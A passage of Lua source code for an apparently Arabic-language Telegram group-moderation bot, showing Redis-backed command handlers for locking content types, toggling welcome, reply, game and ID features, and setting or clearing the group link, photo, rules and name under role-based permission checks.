redis:set(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الماركداون")  
elseif text ==  "قفل الماركداون بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الماركداون")  
elseif text ==  "قفل الماركداون بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الماركداون")  
elseif text ==  "قفل الماركداون بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الماركداون")  
elseif text ==  "فتح الماركداون" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الماركداون")  
elseif text ==  "قفل الجهات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الجهات")  
elseif text ==  "قفل الجهات بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الجهات")  
elseif text ==  "قفل الجهات بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الجهات")  
elseif text ==  "قفل الجهات بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الجهات")  
elseif text ==  "فتح الجهات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الجهات")  
elseif text ==  "قفل الكلايش" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الكلايش")  
elseif text ==  "قفل الكلايش بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الكلايش")  
elseif text ==  "قفل الكلايش بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الكلايش")  
elseif text ==  "قفل الكلايش بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الكلايش")  
elseif text ==  "فتح الكلايش" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الكلايش")  
elseif text ==  "قفل الانلاين" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Inlen"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الانلاين")  
elseif text ==  "قفل الانلاين بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Inlen"..msg.chat_id_,"ked")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل الانلاين")  
elseif text ==  "قفل الانلاين بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Inlen"..msg.chat_id_,"ktm")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل الانلاين")  
elseif text ==  "قفل الانلاين بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:set(bot_id.."Tshakex:Lock:Inlen"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل الانلاين")  
elseif text ==  "فتح الانلاين" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id.."Tshakex:Lock:Inlen"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح الانلاين")  
elseif text ==  "قفل التكرار بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:hset(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل التكرار")
elseif text ==  "قفل التكرار" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:hset(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل التكرار بالحذف")
elseif text ==  "قفل التكرار بالتقييد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:hset(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","• تم قفل التكرار")
elseif text ==  "قفل التكرار بالكتم" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:hset(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","• تم قفل التكرار")
elseif text ==  "فتح التكرار" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:hdel(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح التكرار")
end

if text == 'تفعيل جلب الرابط' or text == 'تفعيل الرابط' then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end  
redis:set(bot_id..'Tshakex:Link_Group'..msg.chat_id_,true) 
return send(msg.chat_id_, msg.id_,'• تم تفعيل جلب الرابط المجموعه') 
end
if text == 'تعطيل جلب الرابط' or text == 'تعطيل الرابط' then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end
redis:del(bot_id..'Tshakex:Link_Group'..msg.chat_id_) 
return send(msg.chat_id_, msg.id_,'• تم تعطيل جلب رابط المجموعه') 
end
if text == 'تفعيل الترحيب' then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end  
redis:set(bot_id..'Tshakex:Chek:Welcome'..msg.chat_id_,true) 
return send(msg.chat_id_, msg.id_,'• تم تفعيل ترحيب المجموعه') 
end
if text == 'تعطيل الترحيب' then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end  
redis:del(bot_id..'Tshakex:Chek:Welcome'..msg.chat_id_) 
return send(msg.chat_id_, msg.id_,'• تم تعطيل ترحيب المجموعه') 
end
if text == 'تفعيل الردود' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end   
redis:del(bot_id..'Tshakex:Reply:Manager'..msg.chat_id_)  
return send(msg.chat_id_, msg.id_,'• تم تفعيل الردود') 
end
if text == 'تعطيل الردود' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end  
redis:set(bot_id..'Tshakex:Reply:Manager'..msg.chat_id_,true)  
return send(msg.chat_id_, msg.id_,'• تم تعطيل الردود' ) 
end
if text == 'تفعيل الردود العامه' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end   
redis:del(bot_id..'Tshakex:Reply:Sudo'..msg.chat_id_)  
return send(msg.chat_id_, msg.id_,'• تم تفعيل الردود العامه ' ) 
end
if text == 'تعطيل الردود العامه' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end  
redis:set(bot_id..'Tshakex:Reply:Sudo'..msg.chat_id_,true)   
return send(msg.chat_id_, msg.id_,'• تم تعطيل الردود العامه ' ) 
end
if text == 'تفعيل ضافني' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end   
redis:set(bot_id..'Added:Me'..msg.chat_id_,true)  
return send(msg.chat_id_, msg.id_,'• تم تفعيل امر ضافني') 
end
if text == 'تفعيل صيح' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end   
redis:set(bot_id..'Seh:User'..msg.chat_id_,true)  
return send(msg.chat_id_, msg.id_,'• تم تفعيل امر صيح') 
end
if text == 'تفعيل اطردني' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end   
redis:del(bot_id..'Tshakex:Cheking:Kick:Me:Group'..msg.chat_id_)  
return send(msg.chat_id_, msg.id_,'• تم تفعيل امر اطردني') 
end
if text == 'تعطيل ضافني' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end   
redis:del(bot_id..'Added:Me'..msg.chat_id_)  
return send(msg.chat_id_, msg.id_,'• تم تعطيل امر ضافني') 
end
if text == 'تعطيل صيح' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end   
redis:del(bot_id..'Seh:User'..msg.chat_id_)  
return send(msg.chat_id_, msg.id_,'• تم تعطيل امر صيح') 
end
if text == 'تعطيل اطردني' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end  
redis:set(bot_id..'Tshakex:Cheking:Kick:Me:Group'..msg.chat_id_,true)  
return send(msg.chat_id_, msg.id_,'• تم تعطيل امر اطردني') 
end
if text == 'تفعيل المغادره' then   
if not Dev_Bots(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - المطور الاساسي*')
end
redis:del(bot_id..'Tshakex:Lock:Left'..msg.chat_id_)  
return send(msg.chat_id_, msg.id_,'• تم تفعيل مغادرة البوت') 
end
if text=="اذاعه بالتثبيت" and Dev_Bots(msg) then 
redis:setex(bot_id.."BotTshakex:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"🔘┇ارسل لي المنشور الان\n〽┇يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n⚠┇لالغاء الاذاعه ارسل : الغاء") 
return false
end

if text == 'تعطيل المغادره' then  
if not Dev_Bots(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - المطور الاساسي*')
end
redis:set(bot_id..'Tshakex:Lock:Left'..msg.chat_id_,true)   
return send(msg.chat_id_, msg.id_, '• تم تعطيل مغادرة البوت') 
end
if text == 'تفعيل الاذاعه' then  
if not Dev_Bots(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - المطور الاساسي*')
end
redis:del(bot_id..'Tshakex:Broadcasting:Bot') 
return send(msg.chat_id_, msg.id_,'• تم تفعيل الاذاعه \n• الان يمكن للمطور   الاذاعه' ) 
end
if text == 'تعطيل الاذاعه' then  
if not Dev_Bots(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - المطور الاساسي*')
end
redis:set(bot_id..'Tshakex:Broadcasting:Bot',true) 
return send(msg.chat_id_, msg.id_,'• تم تعطيل الاذاعه') 
end
if text == 'تفعيل الايدي' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end   
redis:del(bot_id..'Tshakex:Lock:Id:Photo'..msg.chat_id_) 
return send(msg.chat_id_, msg.id_,'• تم تفعيل الايدي') 
end
if text == 'تعطيل الايدي' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end  
redis:set(bot_id..'Tshakex:Lock:Id:Photo'..msg.chat_id_,true) 
return send(msg.chat_id_, msg.id_,'• تم تعطيل الايدي') 
end
if text == 'تفعيل الايدي بالصوره' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end   
redis:del(bot_id..'Tshakex:Lock:Id:Py:Photo'..msg.chat_id_) 
return send(msg.chat_id_, msg.id_,'• تم تفعيل الايدي بالصوره') 
end
if text == 'تعطيل الايدي بالصوره' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end  
redis:set(bot_id..'Tshakex:Lock:Id:Py:Photo'..msg.chat_id_,true) 
return send(msg.chat_id_, msg.id_,'• تم تعطيل الايدي بالصوره') 
end
if text == 'تعطيل الالعاب' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end   
redis:del(bot_id..'Tshakex:Lock:Game:Group'..msg.chat_id_) 
return send(msg.chat_id_, msg.id_,'• تم تعطيل الالعاب') 
end
if text == 'تفعيل الالعاب' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end  
redis:set(bot_id..'Tshakex:Lock:Game:Group'..msg.chat_id_,true) 
return send(msg.chat_id_, msg.id_,'• تم تفعيل الالعاب') 
end
if text == 'تفعيل البوت الخدمي' then  
if not Dev_Bots(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - المطور الاساسي*')
end
redis:del(bot_id..'Tshakex:Free:Bot') 
return send(msg.chat_id_, msg.id_,'• تم تفعيل البوت الخدمي \n• الان يمكن الجميع تفعيله') 
end
if text == 'تعطيل البوت الخدمي' then  
if not Dev_Bots(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - المطور الاساسي*')
end
redis:set(bot_id..'Tshakex:Free:Bot',true) 
return send(msg.chat_id_, msg.id_,'• تم تعطيل البوت الخدمي') 
end
if text == 'تعطيل الطرد' or text == 'تعطيل الحظر' then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end
redis:set(bot_id..'Tshakex:Lock:Ban:Group'..msg.chat_id_,'true')
return send(msg.chat_id_, msg.id_, '• تم تعطيل - ( الحظر - الطرد ) ')
end
if text == 'تفعيل الطرد' or text == 'تفعيل الحظر' then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end
redis:del(bot_id..'Tshakex:Lock:Ban:Group'..msg.chat_id_)
return send(msg.chat_id_, msg.id_, '• تم تفعيل - ( الحظر - الطرد ) ')
end
if text == 'تعطيل الرفع' or text == 'تعطيل الترقيه' then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end
redis:set(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_,'true')
return send(msg.chat_id_, msg.id_, '• تم تعطيل رفع - ( الادمن - المميز ) ')
end
if text == 'تفعيل الرفع' or text == 'تفعيل الترقيه' then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end
redis:del(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_)
return send(msg.chat_id_, msg.id_, '• تم تفعيل رفع - ( الادمن - المميز ) ')
end
if text == 'تعطيل صورتي' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end
redis:set(bot_id..'my_photo:status:bot'..msg.chat_id_,'yazon')
return send(msg.chat_id_, msg.id_, '• تم تعطيل - ( امر صورتي ) ')
end
if text == 'تفعيل صورتي' then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end
redis:del(bot_id..'my_photo:status:bot'..msg.chat_id_)
return send(msg.chat_id_, msg.id_, '• تم تفعيل - ( امر صورتي ) ')
end

if text and text:match("^صيح (.*)$") then
local username = text:match("^صيح (.*)$") 
if redis:get(bot_id..'Seh:User'..msg.chat_id_) then
function start_function(extra, result, success)
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_,'• المعرف غلط ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,'• لا اسطيع صيح معرفات القنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,'• لا اسطيع صيح معرفات البوتات') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'• لا اسطيع صيح معرفات المجموعات') 
return false  
end
if result.id_ then
send(msg.chat_id_, msg.id_,'• تعال يبونك [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,' امر صيح تم تعطيله من قبل المدراء ') 
end
return false
end
if text and text:match("(.*)(ضافني)(.*)") then
if redis:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,' انت منشئ المجموعه ') 
return false
end
local Added_Me = redis:get(bot_id.."Tshakex:Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '• هذا الي ضافك  ⇠ '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,'• انت دخلت عبر الرابط ') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,'• امر منو ضافني تم تعطيله من قبل المدراء ') 
end
end
if text == "صورتي" or text == 'افتاري' then
local my_ph = redis:get(bot_id..'my_photo:status:bot'..msg.chat_id_)
print(my_ph)
if not my_ph then
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[0].sizes_[1].photo_.persistent_id_,'')
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك')
end 
end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
end

if text == "ضع رابط" and Admin(msg) or text == "وضع رابط" and Admin(msg) then
send(msg.chat_id_,msg.id_,"• ارسل رابط المجموعه او رابط قناة المجموعه")
redis:setex(bot_id.."Tshakex:link:set"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false 
end
if text and text:match("^ضع صوره") and Admin(msg) and msg.reply_to_message_id_ == 0 or text and text:match("^وضع صوره") and Admin(msg) and msg.reply_to_message_id_ == 0 then  
redis:set(bot_id.."Tshakex:Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_,true) 
send(msg.chat_id_,msg.id_,"• ارسل الصوره لوضعها") 
return false 
end
if text == "ضع وصف" and Admin(msg) or text == "وضع وصف" and Admin(msg) then  
redis:setex(bot_id.."Tshakex:Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_,msg.id_,"• ارسل الان الوصف")
return false 
end
if text == "ضع ترحيب" and Admin(msg) or text == "وضع ترحيب" and Admin(msg) then  
redis:setex(bot_id.."Tshakex:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_,msg.id_,"• ارسل لي الترحيب الان".."\n• تستطيع اضافة مايلي !\n• دالة عرض الاسم »{`name`}\n• دالة عرض المعرف »{`user`}") 
return false 
end
if text == "ضع قوانين" and Admin(msg) or text == "وضع قوانين" and Admin(msg) then 
redis:setex(bot_id.."Tshakex:Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_,"• ارسل لي القوانين الان")  
return false 
end
if text and text:match("^ضع اسم (.*)") and Owner(msg) or text and text:match("^وضع اسم (.*)") and Owner(msg) then 
local Name = text:match("^ضع اسم (.*)") or text:match("^وضع اسم (.*)") 
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"•  البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"•  ليست لدي صلاحية تغير اسم المجموعه")  
else
send(msg.chat_id_,msg.id_,"•  تم تغير اسم المجموعه الى {["..Name.."]}")  
end
end,nil) 
return false 
end
if text == "الرابط" then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local status_Link = redis:get(bot_id.."Tshakex:Link_Group"..msg.chat_id_)
local link = redis:get(bot_id.."Tshakex:link:set:Group"..msg.chat_id_)     
       
if link then                              
send1(msg.chat_id_,msg.id_,"["..ta.title_.."]("..link..")")                          
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
send1(msg.chat_id_,msg.id_,"["..ta.title_.."]("..linkgpp.result..")")                          
else
send(msg.chat_id_, msg.id_,"• لا يوجد رابط للمجموعه")              
end            
end
end,nil)
return false 
end
if text == "الترحيب" and Admin(msg) then 
if redis:get(bot_id.."Tshakex:Get:Welcome:Group"..msg.chat_id_)   then 
Welcome = redis:get(bot_id.."Tshakex:Get:Welcome:Group"..msg.chat_id_)  
else 
Welcome = "• لم يتم تعين ترحيب للمجموعه"
end 
send(msg.chat_id_, msg.id_,"["..Welcome.."]") 
return false 
end
if text == "القوانين" then 
local Set_Rules = redis:get(bot_id.."Tshakex::Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_,"• اهلا عزيزي لديك قائمة قوانين القروب و هي كالاتي \n يمنع سب و شتم نهايا \n يمنع تدخل في الاوامر الساسيه و دينيه \n احترام مالك او مشرفين قروب واجب عليك \n احترم تحترم و اظهر تربيتك")   
end    
return false 
end
if text == "مسح الرابط" and Admin(msg) or text == "حذف الرابط" and Admin(msg) then
send(msg.chat_id_,msg.id_,"• تم ازالة رابط المجموعه")           
redis:del(bot_id.."Tshakex:link:set:Group"..msg.chat_id_) 
return false 
end
if text == "حذف الصوره" and Admin(msg) or text == "مسح الصوره" and Admin(msg) then 
https.request("https://api.telegram.org/bot"..token.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"• تم ازالة صورة المجموعه") 
return false 
end
if text == "مسح الترحيب" and Admin(msg) or text == "حذف الترحيب" and Admin(msg) then 
redis:del(bot_id.."Tshakex:Get:Welcome:Group"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"• تم ازالة ترحيب المجموعه") 
return false 
end
if text == "مسح القوانين" and Admin(msg) or text == "حذف القوانين" and Admin(msg) then  
send(msg.chat_id_, msg.id_,"• تم ازالة قوانين المجموعه")  
redis:del(bot_id.."Tshakex::Rules:Group"..msg.chat_id_) 
return false 
end
if text == 'حذف الايدي' and Owner(msg) or text == 'مسح الايدي' and Owner(msg) then
redis:del(bot_id.."Tshakex:Set:Id:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '• تم ازالة كليشة الايدي ')
return false 
end
if text == 'مسح رسائلي' then
redis:del(bot_id..'Tshakex:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_, msg.id_,'• تم مسح جميع رسائلك ') 
return false 
end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' then
redis:del(bot_id..'Tshakex:Num:Message:Edit'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_, msg.id_,'• تم مسح جميع تعديلاتك ') 
return false 
end
if text == 'مسح جهاتي' then
redis:del(bot_id..'Tshakex:Num:Add:Memp'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_, msg.id_,'• تم مسح جميع جهاتك المضافه ') 
return false 
end
if text ==("مسح") and Admin(msg) and tonumber(msg.reply_to_message_id_) > 0 then
Delete_Message(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, delbans, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
return false 
end
if text and text:match("^وضع تكرار (%d+)$") and Admin(msg) then   
redis:hset(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,text:match("^وضع تكرار (%d+)$")) 
send(msg.chat_id_, msg.id_,"• تم وضع عدد التكرار : "..text:match("^وضع تكرار (%d+)$").."")  
return false 
end
if text and text:match("^وضع زمن التكرار (%d+)$") and Admin(msg) then   
redis:hset(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,text:match("^وضع زمن التكرار (%d+)$")) 
send(msg.chat_id_, msg.id_,"• تم وضع زمن التكرار : "..text:match("^وضع زمن التكرار (%d+)$").."") 
return false 
end
if text == "مسح قائمة المنع" and Admin(msg) then   
local list = redis:smembers(bot_id.."Tshakex:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
redis:del(bot_id.."Tshakex:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
redis:del(bot_id.."Tshakex:Filter:Reply2"..v..msg.chat_id_)  
redis:srem(bot_id.."Tshakex:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_,"• تم مسح قائمة المنع")  
return false 
end
if text == "قائمة المنع" and Admin(msg) then   
